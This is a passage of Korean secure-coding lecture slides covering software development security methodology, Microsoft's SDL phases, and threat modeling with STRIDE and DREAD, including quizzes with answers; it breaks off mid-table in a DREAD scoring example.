- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어
- OWASP - https://owasp.org/
- CVE - https://cve.mitre.org/
- CWE - https://cwe.mitre.org/
- SEI CERT Coding Standards - https://wiki.sei.cmu.edu/confluence/display/seccode

---

## [2-SLIDES] 1주차 3차시 p.48 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 1주차 3차시 p.49 · 퀴즈
퀴즈
1. 다음 중 '취약한 접근 통제' 취약점에 대한 설명이 맞는 것은?
1) 2) 손쉬운 암호 설정으로 인해 부루트포스 공격 가능
인증된 사용자가 접근이 제한된 데이터나 기능에 접근 가능
3) 4) 틀린 암호를 무제한으로 시도 가능
없는 주소를 입력하였을 때 에러 메시지와 함께 서버 정보 노출
2. 다음 중 '인젝션 공격'에 대한 설명으로 틀린 것은?
1) 2)
사용자 입력값을 검증하고 필터링하면 방어할 수 있다.
악성 코드를 삽입하는 공격이다.
3) 4)
커맨드 인젝션 방어를 위해 Prepared Statement를 사용해야 한다. 주로 사용자의 입력값을 그대로 파라미터로 사용할 때 발생한다.
3. 다음 중 CVE와 CWE에 대해서 잘못 이야기한 것은?
1) 2)
CVE는 소프트웨어와 하드웨어 보안 취약점을 공개한 시스템이다. 보안 연구원, 기업, 기관이 발견한 취약점은 CNA에 보고된다.
3) 4)
CWE Top 25는 보안 취약점 중 가장 위험한 25가지를 선정한 목록이다. 특정제품에서 발견된 취약점은 CVE 목록에서 찾을 수 있다.

---

## [2-SLIDES] 1주차 3차시 p.50 · 퀴즈 정답
퀴즈 정답
1. 다음 중 '취약한 접근 통제' 취약점에 대한 설명이 맞는 것은?
1)
인증된 사용자가 접근이 제한된 데이터나 기능에 접근 가능
취약한 접근 통제 취약점은 적절한 인가 처리가 이루어지지 않아서 중요한 리소스 또는 기능이 권한 없는 사용자에게 노출될 수 있는 취
약점을 말합니다.
2. 다음 중 '인젝션 공격'에 대한 설명으로 틀린 것은?
3)
커맨드 인젝션 방어를 위해 Prepared Statement를 사용해야 한다.
Prepared Statement 는 데이터베이스를 조작할 떄 쿼리를 만드는 방법이며, SQL 인젝션을 예방할 수 있습니다.
3. 다음 중 CVE와 CWE에 대해서 잘못 이야기한 것은?
3)
CWE Top 25는 보안 취약점 중 가장 위험한 25가지를 선정한 목록이다.
CWE는 보안 약점 목록을 말하며, 보안 취약점 목록은 CVE 입니다.

# [2-SLIDES] 2주차 1차시 — SW개발보안 방법론·위협 모델링
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Authentication/인증/로그인 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 2주차 1차시 p.1 · 시큐어코딩
시큐어코딩

---

## [2-SLIDES] 2주차 1차시 p.2 · SW개발보안 방법론
SW개발보안 방법론
01 소프트웨어 개발보안 방법론
02 MS-SDL

---

## [2-SLIDES] 2주차 1차시 p.3 · 학습 목표
학습 목표
소프트웨어 개발보안 방법론의 개념과 필요성을 이해한다.
SW개발 생명주기(SDLC) 전 단계에 걸친 보안 활동의 목적과 내용을 이해한다.
MS-SDL의 단계별 보안 적용 사례를 이해하고 설명할 수 있다.
보안을 고려한 소프트웨어 개발이 왜 중요한지, 기업 및 조직에 미치는 영향을 인식한다.

---

## [2-SLIDES] 2주차 1차시 p.4 · 학습 내용
학습 내용
1. 소프트웨어 개발보안 방법론의 주요 개념과 원칙
2. SDLC 단계별 보안활동(분석, 설계, 구현, 테스트)의 핵심 내용
3. 보안 적용 시 비용 절감 효과
4. MS-SDL 단계별 보안 적용 사례

---

## [2-SLIDES] 2주차 1차시 p.5 · SW개발보안 방법론
SW개발보안 방법론
01 소프트웨어 개발보안 방법론
02 MS-SDL

---

## [2-SLIDES] 2주차 1차시 p.6 · SW개발보안 방법론
SW개발보안 방법론
SW 개발 보안 방법론은 소프트웨어 개발 과정에서 보안성을 강화하기 위해 적용하는 체계적인 접근 방식.
소프트웨어 개발 생명주기(SDLC: Software Development Life Cycle) 전반에 걸쳐 보안 요구사항을
반영하고, 취약점을 예방하는 것을 목표로 함.
SW 개발 보안 방법론의 주요 개념
보안 내재화(Security by Design): 개발 초기부터 보안을 고려하여 설계
취약점 최소화(Minimization of Vulnerabilities): 코드 및 시스템의 보안 결함을 줄이는 방식 적용
지속적인 보안 점검(Continuous Security Assessment): 주기적인 테스트 및 검증 수행

---

## [2-SLIDES] 2주차 1차시 p.7 · SW개발보안 방법론
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
SW개발보안 방법론

**SW 개발보안이란?** 안전한 SW 개발을 위해 소스코드 등에 존재할 수 있는 잠재적인 보안 약점을 제거하고, 보안을 고려하여 기능을 설계·구현하는 등 SW 개발 과정에서 실행되는 일련의 보안활동

| 분석 | 설계 | 구현 | 테스트 |
| --- | --- | --- | --- |
| • 요구사항 중 보안요구사항 식별 | • 보안요구사항과 위협에 대한 보안통제를 고려한 위협원 도출 / • 외부 인터페이스 식별 / • 보안통제 수립 | • 표준코딩 정의서 및 SW개발보안 가이드를 준수하여 개발 / • 소스코드 보안약점 진단(도구 활용) | • 실행코드 보안취약점 진단 (동적분석: 스캐닝, 모의해킹 테스트 등) |

- ※ 현재는 SW 개발과정 중 **소스코드 구현단계를 중심으로** SW 개발보안 적용
- ※ **보안취약점(Vulnerability)**: 해킹 등 실제 보안사고에 이용되는 SW 보안약점
- ※ **보안약점(Weakness)**: 보안취약점의 근본 원인이 되는 SW 상의 허점, 결점, 오류 등

---

## [2-SLIDES] 2주차 1차시 p.8 · SW개발보안 적용 시 비용 효과
SW개발보안 적용 시 비용 효과

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**〈SW 개발 단계별 결함 수정비용 분석〉** (※ 출처: The Economic Impacts of Inadequate Infrastructure for SW Testing, 2002.5, NIST)

| 구분 | 설계단계 | 코딩단계 | 통합단계 | 베타제품 | 제품출시 |
| --- | --- | --- | --- | --- | --- |
| 설계과정 결함 | 1배 | 5배 | 10배 | 15배 | 30배 |
| 코딩과정 결함 | | 1배 | 10배 | 20배 | 30배 |
| 통합과정 결함 | | | 1배 | 10배 | 20배 |

(결함이 늦게 발견될수록 수정비용이 커짐)

**정보보호 투자수익률** (막대그래프, ※ 출처: IBM 연구보고서)

| 단계 | 설계 | 구현 | 테스팅 |
| --- | --- | --- | --- |
| 투자수익률 | 24% | 15% | 12% |

**정보보호 취약성 수정비용** (막대그래프, 설계 단계 수정비용 = 1 기준, ※ 출처: 마이크로소프트)

| 단계 | 설계 | 구현 | 테스팅 | 유지보수 |
| --- | --- | --- | --- | --- |
| 수정비용 | 1 | 6.5 | 15 | 60 ~ 100 |

---

## [2-SLIDES] 2주차 1차시 p.9 · SW개발보안 방법론 적용의 중요성
SW개발보안 방법론 적용의 중요성
〮
해킹, 데이터 유출 등 보안 사고 예방
〮
법적 규제(개인정보 보호법, GDPR, ISO 27001 등) 준수
〮
개발 비용 절감 (초기 단계에서 보안 문제 해결 시 비용 절감 효과)
〮
신뢰할 수 있는 소프트웨어 제공으로 기업 이미지 및 서비스 경쟁력 강화

---

## [2-SLIDES] 2주차 1차시 p.10 · SW개발보안 방법론
SW개발보안 방법론
01 소프트웨어 개발보안 방법론
02 MS-SDL

---

## [2-SLIDES] 2주차 1차시 p.11 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
1. MS-SDL이란?
MS-SDL(Microsoft Security Development Lifecycle은 마이크로소프트(Microsoft)에서 개발한 소프트웨어 보안
개발 방법론으로, 소프트웨어 개발 생명주기(SDLC) 전반에 걸쳐 보안을 내재화하는 것을 목표로 함
보안 취약점을 최소화하고, 보안 사고를 예방하며, 강력한 보안 정책을 소프트웨어 개발 과정에 적용하는 방법론
2. MS-SDL의 주요 목표
1. 보안 취약점 예방: 개발 초기부터 보안 요구사항을 반영하여 보안 문제를 사전에 차단
2. 위험 감소: 보안 테스트 및 코드 검토를 통해 공격에 대한 노출을 최소화
3. 법규 및 규제 준수: 개인정보 보호, 보안 표준(ISO/IEC 27001, GDPR 등) 준수
4. 비용 절감: 개발 후반이 아닌 초기에 보안 문제를 해결하여 유지보수 비용 절감

---

## [2-SLIDES] 2주차 1차시 p.12 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
보안 개발 방법론의 대표적인 사례로 마이크로소프트(Microsoft)의 개발 생명주기(MS-SDL)는 자체적으로 개발한
개발 생명주기를 제품 개발 전 과정에 적용하여 보안취약점의 원인을 제거하도록 하였다.
교육 및 보안인식 단계
- 소프트웨어 개발팀의 구성원들을 대상으로 매년 한 번씩 보안의 기초와 최신 보안 동향에 대해 교육
- 보안 교육은 안전설계, 위협모델링, 시큐어코딩, 보안테스팅, 프라이버시에 관한 내용 포함

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[단계 바: MS-SDL 7단계 — 화살표로 이어짐, 핀으로 현재 단계를 표시]

**Training** → **Requirements** → **Design** → **Implementation** → **Verification** → **Release** → **Response**

(Training·Response는 파란색, 나머지 5단계는 초록색. 이 쪽의 현재 단계 = **Training**)

---

## [2-SLIDES] 2주차 1차시 p.13 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
요구사항 정의 단계
- 보안 및 개인정보 보호 요구사항 정의
- 법적/규제 요건(예: GDPR, HIPAA, ISO 27001) 검토
- 위협 모델링 수행 필요성 확인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Requirements**]

---

## [2-SLIDES] 2주차 1차시 p.14 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
설계단계
- 위협 모델링(Threat Modeling) 수행
. 시스템의 공격 표면(Attack Surface) 분석
. 보안 위험 평가 및 설계 개선
- 안전한 소프트웨어 아키텍처 설계
- 데이터 보호 및 암호화 정책 정의

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Design**]

---

## [2-SLIDES] 2주차 1차시 p.15 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
구현 단계
- 안전한 코딩(Security Coding) 원칙 적용
. OWASP Secure Coding Guide 준수
. 보안 API 활용 (예: 인증, 접근 제어, 암호화)
- 정적 분석(SAST) 수행
. 코드 내 취약점 자동 탐지 (예: SQL Injection, XSS)
- 취약점 라이브러리 및 구성 요소 제거
. 최신 보안 패치 적용
. 서드파티 라이브러리의 취약점 관리

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Implementation**]

---

## [2-SLIDES] 2주차 1차시 p.16 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
검증 단계
- 보안 테스트(Security Testing) 수행
. 정적 분석(SAST) 및 동적 분석(DAST) 도구 활용
. 침투 테스트(Penetration Testing) 수행
- 위험 기반 보안 점검
. 중요 기능(인증, 접근 제어, 암호화)의 보안 검증
. 코드 리뷰 및 취약점 제거

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Verification**]

---

## [2-SLIDES] 2주차 1차시 p.17 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
배포 단계
- 최종 보안 점검(Security Review) 수행
. 남아있는 보안 이슈 확인 및 해결
- 디지털 서명 및 무결성 검증
. 배포 패키지의 보안 검증
- 보안 가이드 문서 제공
. 사용자를 위한 보안 정책 및 설정 안내

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Release**]

---

## [2-SLIDES] 2주차 1차시 p.18 · 소프트웨어 개발보안 적용 우수사례 MS-SDL
소프트웨어 개발보안 적용 우수사례 MS-SDL
마이크로소프트에서 적용한 MS-SDL
운영 및 유지보수 단계
- 보안 모니터링 및 로그 분석 : 이상 징후 탐지 및 대응 체계 구축
- 보안 패치 및 업데이트 관리 : 취약점 발견 시 신속한 대응
- 보안 사고 대응 프로세스 마련 : 침해사고 발생 시 대응 계획 실행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[MS-SDL 7단계 바 (Training → Requirements → Design → Implementation → Verification → Release → Response) — 이 쪽의 현재 단계 = **Response**]

---

## [2-SLIDES] 2주차 1차시 p.19 · 요약 정리
요약 정리
SW 개발보안은 개발 전 과정에서 보안을 적용하는 방법론이다.
분석~테스트 단계별로 보안 활동을 수행한다.
조기 보안 적용은 사고 예방과 비용 절감에 효과적이다.
MS-SDL은 마이크로소프트의 대표적 보안 개발 방법이다.
교육부터 운영까지 모든 단계에 보안을 반영한다.

---

## [2-SLIDES] 2주차 1차시 p.20 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴, 암호화까지 안전한 소프트
웨어의 모든 것
- MS-SDL - https://learn.microsoft.com/ko-kr/compliance/assurance/assurance-microsoft-security-
development-lifecycle

---

## [2-SLIDES] 2주차 1차시 p.21 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 2주차 1차시 p.22 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 다음 중 SW개발보안 방법론의 주요 개념이 아닌 것은?
   1) 지속적인 보안 점검　2) 보안 내재화　3) SBOM 다중화　4) 취약점 최소화
2. 다음 중 SW 결함 수정비용이 가장 많이 필요한 경우는?
   1) 코딩과정 발생한 결함이 통합 단계에서 발견된 경우
   2) 설계과정 발생한 결함이 제품 출시 단계에서 발견된 경우
   3) 설계과정 발생한 결함이 코딩 단계에서 발견된 경우
   4) 통합과정 발생한 결함이 제품출시 단계에서 발견된 경우
3. 다음 중 MS-SDL 보안개발 방법론에 대한 설명 중 틀린 것은?
   1) 보안 문제를 사전에 차단한다.　2) 요구사항 정의 단계에 위협 모델링을 수행한다.
   3) 구현 단계에서 정적 분석을 수행한다.　4) 배포 단계에서 보안 가이드 문서를 제공한다.

---

## [2-SLIDES] 2주차 1차시 p.23 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **3) SBOM 다중화** — SW개발보안 방법론의 주요 개념은 보안 내재화, 취약점 최소화, 지속적인 보안 점검입니다.
2. **2) 설계과정 발생한 결함이 제품 출시 단계에서 발견된 경우** — 개발의 최초 과정에서 발생한 결함이 최종 출시 단계까지 가서 알게 된다면 가장 많은 수정비용이 발생합니다. (위 표 기준 30배)
3. **2) 요구사항 정의 단계에 위협 모델링을 수행한다.** — 위협 모델링은 설계 단계에 수행하는 내용에 해당합니다.

# [2-SLIDES] 2주차 2차시 — SW개발보안 방법론·위협 모델링
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · MFA/Multi-Factor/다중 인증/다중 매체 인증/OTP/FIDO2/WebAuthn · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 2주차 2차시 p.1 · 시큐어코딩
시큐어코딩

---

## [2-SLIDES] 2주차 2차시 p.2 · 위협모델링 개요
위협모델링 개요
01 위협모델링 개요
02 위협모델링 프로세스

---

## [2-SLIDES] 2주차 2차시 p.3 · 학습 목표
학습 목표
위협모델링의 개념과 중요성을 이해한다.
위협모델링의 핵심 단계와 목적을 설명할 수 있다.
각 참여자의 역할과 협업 구조를 이해한다.
MS-SDL에 기반한 위협모델링 프로세스를 파악한다.
STRIDE, DREAD 등 주요 위협모델링 프레임워크의 특징을 설명할 수 있다.

---

## [2-SLIDES] 2주차 2차시 p.4 · 학습 내용
학습 내용
1. 위협모델링의 정의와 핵심 개념
2. 위협모델링의 필요성과 기대 효과
3. 역할별 위협모델링 참여 구조
4. STRIDE, DREAD 등 프레임워크 소개
5. MS-SDL 위협모델링 프로세스 및 단계별 활동

---

## [2-SLIDES] 2주차 2차시 p.5 · 위협모델링 개요
위협모델링 개요
01 위협모델링 개요
02 위협모델링 프로세스

---

## [2-SLIDES] 2주차 2차시 p.6 · 위협모델링(Threat Modeling) 이란?
위협모델링(Threat Modeling) 이란?
위협 모델링(Threat Modeling)은 소프트웨어, 시스템 또는 네트워크의 보안 취약점을 사전에 식별하고,
이를 평가하여 적절한 보안 대책을 수립하는 과정
주요 개념
- 사전 예방적 보안 접근법: 설계 단계에서 보안 위협을 예측하고 방어책을 마련하는 방식.
- 공격자 관점의 분석: 공격자가 시스템을 어떻게 악용할 수 있는지를 분석하여, 보안 취약점을 최소화.
- 개발 프로세스 내 통합: 보안이 개발 과정(SDLC)에서 자연스럽게 반영될 수 있도록 구조화된 방법론 적용.
위협 모델링은 설계 단계부터 보안을 고려하고, 실질적인 공격 시나리오를 예측하여 사전 대응할 수 있는 강력한 방법론

---

## [2-SLIDES] 2주차 2차시 p.7 · 위협모델링(Threat Modeling)의 핵심 목표
위협모델링(Threat Modeling)의 핵심 목표
위협 모델링의 핵심 목표
1.시스템 이해: 보호해야 할 자산(데이터, 기능 등)과 이를 둘러싼 환경을 분석.
2.위협 식별: 해커나 내부 공격자가 악용할 수 있는 취약점을 분석.
3.위험 평가: 위협의 심각도와 발생 가능성을 평가하여 대응 우선순위를 설정.
4.보안 조치 적용: 위협을 완화할 수 있는 설계 및 보안 제어(암호화, 접근제어 등) 적용.

---

## [2-SLIDES] 2주차 2차시 p.8 · 위협모델링(Threat Modeling)이 중요한 이유
위협모델링(Threat Modeling)이 중요한 이유
위협 모델링이 중요한 이유
1. 사전 보안 강화: 개발 초기 단계에서 보안을 고려하여, 비용을 절감하고 보안성을 높일 수 있음.
2. 보안 사고 예방: 공격자의 시각에서 보안 취약점을 분석하여 예상되는 보안 사고를 방지.
3. 법규 및 표준 준수: 금융, 의료 등 특정 산업에서는 보안 규정을 준수하기 위한 필수 절차.
4. DevSecOps 연계: 보안이 지속적으로 개발 및 운영 과정에서 반영될 수 있도록 지원.

---

## [2-SLIDES] 2주차 2차시 p.9 · 위협모델링(Threat Modeling) 참가자 및 역할 (1)
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링(Threat Modeling) 참가자 및 역할 (1)

| 직무명 | 개발팀 (Developers) | 보안 전문가 (Security Engineers / Security Architects) | 시스템 아키텍트 (System Architects) |
| --- | --- | --- | --- |
| **역할** | 시스템의 구조를 이해하고, 보안 요구사항을 코드에 반영. | 보안 위협을 식별하고, 취약점 분석 및 대응책 수립. | 시스템의 설계를 담당하며, 보안이 고려된 설계 구조를 반영. |
| **참여이유** | • 애플리케이션의 동작 방식과 기술적 구현을 가장 잘 이해. / • 보안 취약점이 발생할 가능성이 높은 코드 영역을 식별. / • 위협 모델링 과정에서 제안된 보안 개선 사항을 직접 구현. | • 공격자의 관점에서 보안 위협을 예측하고, 효과적인 방어 전략을 제안. / • 최신 보안 위협 동향 및 취약점 정보를 제공. / • 위협 모델링 프레임워크(예: STRIDE, DREAD)를 적용하여 체계적인 분석 수행. | • 애플리케이션 및 인프라의 전반적인 구조를 설계하는 역할. / • 보안 요구사항을 고려하여 아키텍처를 조정하고 강화. / • 위협 모델링을 기반으로 보안 설계 원칙을 적용. |

---

## [2-SLIDES] 2주차 2차시 p.10 · 위협모델링(Threat Modeling) 참가자 및 역할 (2)
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링(Threat Modeling) 참가자 및 역할 (2)

| 직무명 | 제품 관리자 (Product Owners / Project Managers) | 운영팀 (DevOps / IT Operations) | 품질보증(QA) 및 테스터 (QA Engineers / Penetration Testers) |
| --- | --- | --- | --- |
| **역할** | 보안 요구사항을 개발 프로세스에 반영하고, 프로젝트 일정 관리. | 배포된 애플리케이션의 보안 운영 및 지속적인 모니터링 수행. | 보안 테스트 및 취약점 점검을 통해 위협 모델링 검증. |
| **참여이유** | • 보안 요구사항이 제품 기능에 미치는 영향을 조율. / • 보안과 비즈니스 요구사항 간의 균형을 맞추어 의사결정. / • 위협 모델링 결과를 제품 개발 라이프사이클에 반영. | • 배포 및 운영 환경에서 발생할 수 있는 보안 위협을 파악. / • 보안 로그 및 모니터링 데이터를 분석하여 위협 모델링 결과를 보완. / • DevSecOps 환경에서 자동화된 보안 점검 및 대응 전략을 마련. | • 위협 모델링에서 정의한 위협 시나리오를 기반으로 보안 테스트 수행. / • 침투 테스트(Penetration Testing)를 통해 실제 공격 가능성을 평가. / • 보안 검증을 통해 위협 모델링에서 도출된 보안 요구사항이 충족되었는지 확인. |

---

## [2-SLIDES] 2주차 2차시 p.11 · 위협모델링(Threat Modeling) 흐름
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링(Threat Modeling) 흐름

| 단계 | 주요내용 |
| --- | --- |
| 워크숍 진행 (Threat Modeling Workshops) | • 개발자, 보안 전문가, 아키텍트 등이 함께 위협 모델링을 수행하는 세션 진행. / • 시스템 다이어그램(DFD, Sequence Diagram 등)을 기반으로 위협 분석. |
| 위협 분석 및 평가 | • STRIDE, DREAD, PASTA 등 위협 모델링 기법을 적용하여 위협 분석. / • 참가자들이 위협의 심각도를 평가하고 대응 우선순위 결정. |
| 보안 설계 개선 및 구현 | • 개발팀이 보안 요구사항을 코드에 반영. / • 운영팀이 보안 모니터링 및 대응 체계를 구축. |

---

## [2-SLIDES] 2주차 2차시 p.12 · 위협모델링(Threat Modeling) 프레임워크
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링(Threat Modeling) 프레임워크

위협 모델링 프레임워크는 소프트웨어, 시스템, 네트워크 등의 보안 위협을 체계적으로 식별하고 분석하는 방법론이다. 프레임워크마다 적용 방식이 다르며, 특정 환경과 목적에 따라 적절한 프레임워크를 선택해야 한다.

**대표적인 위협모델링 프레임워크**

| 프레임워크 | 주요 특징 | 적용 분야 |
| --- | --- | --- |
| **STRIDE**★ | 가장 널리 사용되는 위협모델링 기법으로 6가지 보안 위협 유형 정의 | 애플리케이션 보안, MS-SDL, 클라우드보안 |
| PASTA | 공격자의 관점에서 위협을 분석하고 비즈니스 영향도 평가 | 금융, 의료, 대규모 엔터프라이즈 시스템 |
| **DREAD**★ | 위협을 정량적으로 평가하는 모델, 위험도를 수치화 하여 우선순위 결정 | 침투테스트, 보안 리스크 평가 |
| Attack Tree | 공격 목표를 중심으로 다양한 공격 경로를 시각적으로 표현 | IoT, 산업제어시스템(ICS), 네트워크 보안 |
| OCTAVE | 조직의 전반적인 보안 위험을 평가하고 거버넌스 중심으로 분석 | 기업보안, IT리스크 관리 |

---

## [2-SLIDES] 2주차 2차시 p.13 · 위협모델링 프레임워크 - STRIDE
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 - STRIDE

STRIDE는 Microsoft에서 개발한 가장 널리 사용되는 위협 모델링 프레임워크로, 6가지 보안 위협 유형을 정의한다.

| 위협 유형 | 설명 | 보안대응책 |
| --- | --- | --- |
| **S**poofing (신원 위조) | 공격자가 허가 없이 시스템에 허가된 사용자로 가장 | 강력한 인증(MFA, OAuth) 적용 |
| **T**ampering (데이터 변조) | 데이터가 불법적으로 변경되거나 조작됨 | 무결성 검사(Hash, 디지털 서명) |
| **R**epudiation (부인) | 공격자가 악의적인 행동을 부인 가능 | 로깅 및 감사를 통한 책임 추적(Audit Logs) |
| **I**nformation Disclosure (정보 노출) | 기밀 데이터가 외부에 노출됨 | 데이터 암호화(AES, TLS, SSL) |
| **D**enial of Service (서비스 거부) | 시스템을 사용할 수 없도록 하는 공격 | 트래픽 제한, WAF, DDoS 보호 |
| **E**levation of Privilege (권한 상승) | 공격자가 권한을 상승하여 관리자 권한 획득 | 최소 권한 원칙, 권한 검증 강화 |

---

## [2-SLIDES] 2주차 2차시 p.14 · 위협모델링 프레임워크 – DREAD
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 – DREAD

DREAD는 위협을 정량적으로 평가하여 리스크의 심각도를 수치화하는 모델. 각 항목을 **0~10점**으로 평가하고 합산하여 위험 순위를 설정한다.

| 항목 | 설명 |
| --- | --- |
| **D**amage (피해 규모) | 시스템이 공격을 받을 경우의 피해 정도 |
| **R**eproducibility (재현 가능성) | 공격이 얼마나 쉽게 재현될 수 있는지 |
| **E**xploitability (공격 가능성) | 공격을 수행하기 얼마나 쉬운지 |
| **A**ffected Users (영향 받는 사용자 수) | 공격으로 인해 영향을 받는 사용자 수 |
| **D**iscoverability (발견 가능성) | 공격자가 취약점을 얼마나 쉽게 찾을 수 있는지 |

---

## [2-SLIDES] 2주차 2차시 p.15 · 위협모델링 프레임워크 – DREAD 세부 점수 기준 예시
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 – DREAD 세부 점수 기준 예시

| 점수 | Damage | Reproducibility | Exploitability | Affected Users | Discoverability |
| --- | --- | --- | --- | --- | --- |
| 0점 | 전혀 피해 없음 | 공격 재현 불가능 | 공격이 불가능함 | 특정 내부 테스트 사용자만 영향 | 비공개 코드로 공격자가 알기 어려움 |
| 2~3점 | 일부 기능 오류 발생 | 매우 특수한 조건에서만 재현 가능 | 고급 공격 기술이 필요함 | 일부 내부 사용자 영향 | 전문 보안 연구자가 분석해야 찾을 수 있음 |
| 5점 | 서비스 성능 저하, 데이터 무결성 손상 가능 | 특정 조건을 충족하면 재현 가능 | 일반적인 보안 전문가가 공격 가능 | 일부 외부 사용자 영향 | OWASP Top 10 수준의 일반적인 취약점 |
| 7~8점 | 주요 기능 장애, 데이터 유출 위험 | 거의 모든 환경에서 재현 가능 | 기본적인 해킹 지식만 있어도 가능 | 광범위한 사용자에게 영향 | 자동화된 도구(Nmap, Metasploit)로 쉽게 탐지 가능 |
| 10점 | 시스템 전체 다운, 기밀 데이터 유출 | 언제든지 쉽게 재현 가능 | 누구나 몇 초 만에 공격 가능 | 모든 사용자 및 전체 네트워크 영향 | 구글 검색, 일반 사용자도 취약점 발견 가능 |

예시는 극단적인 값과 중간값으로 설정한 점수 모델. 실무에서는 세부적인 차이를 반영하기 위해 4, 6, 9점도 정의해서 사용할 수 있음.

---

## [2-SLIDES] 2주차 2차시 p.16 · 위협모델링 프레임워크 – DREAD 총점 기준에 따른 위협 수준
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 – DREAD 총점 기준에 따른 위협 수준

| 총점 (D+R+E+A+D) | 위협 수준 | 대응 우선 순위 |
| --- | --- | --- |
| 0~10점 | 낮음 (Low) | 모니터링 필요하지만 즉각 조치는 필요 없음 |
| 11~20점 | 보통 (Medium) | 보안 패치 적용 고려, 필요 시 수정 |
| 21~30점 | 높음 (High) | 보안 조치 필수, 공격 가능성이 높음 |
| 31~50점 | 치명적 (Critical) | 즉시 대응 필요, 긴급 패치 또는 보안 조치 시행 |

---

## [2-SLIDES] 2주차 2차시 p.17 · 위협모델링 프레임워크 – DREAD 평가 예시
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
위협모델링 프레임워크 – DREAD 평가 예시

예시: **약한 패스워드 정책** (ex: 4자리 숫자 비밀번호)

| 평가 항목 | 점수 | 설명 |
| --- | --- | --- |
